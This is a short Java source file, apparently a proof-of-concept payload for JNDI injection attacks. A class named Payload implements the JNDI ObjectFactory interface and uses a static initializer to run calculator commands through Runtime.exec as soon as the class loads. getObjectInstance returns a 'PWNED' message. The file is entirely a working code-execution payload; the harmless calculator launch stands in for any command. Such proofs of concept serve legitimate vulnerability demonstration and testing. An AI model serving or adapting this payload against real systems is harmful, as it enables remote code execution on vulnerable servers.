import java.io.IOException;
import java.util.Hashtable;
import javax.naming.*;
import javax.naming.spi.ObjectFactory;

public final class Payload implements ObjectFactory {

    static {
        launchCalculator();
    }

    public Object getObjectInstance(Object obj,
                                    Name name,
                                    Context nameCtx,
                                    Hashtable<?, ?> environment) {
        return "You have been PWNED!";
    }

    private static void launchCalculator() {
        final String[] calculators = {
            "calc.exe",
            "open -a Calculator",
            "gnome-calculator",
            "kcalc",
            "xcalc",
        };
        System.err.print("Launching calculator... ");
        for (String calculator : calculators) {
            try {
                Runtime.getRuntime().exec(calculator);
            } catch (IOException e) {
                continue;
            }
            System.err.println("success!");
            return;
        }
        System.err.println("couldn't find a calculator to launch :-(");
    }
}
